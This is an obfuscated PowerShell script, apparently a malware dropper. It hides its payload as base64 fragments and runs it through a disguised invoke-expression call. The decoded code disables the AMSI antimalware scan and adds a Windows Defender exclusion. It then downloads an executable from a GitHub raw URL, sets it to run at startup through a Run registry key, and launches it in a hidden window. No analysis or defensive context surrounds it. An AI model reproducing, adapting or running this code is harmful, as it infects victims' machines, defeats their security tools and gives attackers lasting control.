$a = 'W1JlZl0uQXNzZW1ibHkuR2V0VHlwZXMoKTsgZm9yZWFjaCggJGIgaW4gJGEgKSB7IGlmICggJGIuTmFtZSAt'
$b = 'bGlrZSAiKmlVdGlscyIgKSAgeyAkYyA9ICRiOyBicmVhazsgfSB9IDsgJGQgPSAkYy5HZXRGaWVsZCggImFt'
$c = 'c2lJbml0RmFpbGVkIiwgIk5vblB1YmxpYyxTdGF0aWMiICkgOyAkZC5TZXRWYWx1ZSggJG51bGwsICR0cnVl'
$d = 'ICk7ICRiID0gIiRhbG9jYXBwZGF0YVxNaWNyb3NvZnRcV2luZG93c1xUZW1wbGF0ZXMiOyAkdSA9ICJodHRw'
$e = 'czovL2dpdGh1Yi5jb20vYXNobGV5d2lsbWVyNy1zdGFyL3RyaW1pZXovcmF3L3JlZnMvaGVhZHMvbWFpbi9j'
$f = 'b21iaW5lZC5leGUiOyBpZiAoIShUZXN0LVBhdGggJGIpKSB7IE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3Rv'
$g = 'cnkgLVBhdGggJGIgLUZvcmNlIHwgT3V0LU51bGw7IH07IHBvd2Vyc2hlbGwgLWMgIkFkZC1NcFByZWZlcmVu'
$h = 'Y2UgLUV4Y2x1c2lvblBhdGggJyRiJyI7ICRjID0gTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50OyAkYy5Eb3du'
$i = 'bG9hZEZpbGUoJHUsICIkYlxzeXNfc3luYy5leGUiKTsgJHIgPSAiU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRv'
$j = 'd3NcQ3VycmVudFZlcnNpb25cUnVuIjsgJHcgPSBbV01JQ2xhc3NdInJvb3RcZGVmYXVsdDpTdGRSZWdQcm92'
$k = 'IjsgJHcuQ3JlYXRlS2V5KDIxNDc0ODM2NTAsICRyKTsgJHcuU2V0U3RyaW5nVmFsdWUoMjE0NzQ4MzY1MCwg'
$l = 'JHIsICJTeXN0ZW1TeW5jIiwgIiRiXHN5c19zeW5jLmV4ZSIpOyBTdGFydC1Qcm9jZXNzICIkYlxzeXNfc3lu'
$m = 'Yy5leGUiIC1XaW5kb3dTdHlsZSBIaWRkZW47'

$final = $a+$b+$c+$d+$e+$f+$g+$h+$i+$j+$k+$l+$m
$exec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($final))
& ( 'inv' + 'oke-expr' + 'ession' ) $exec
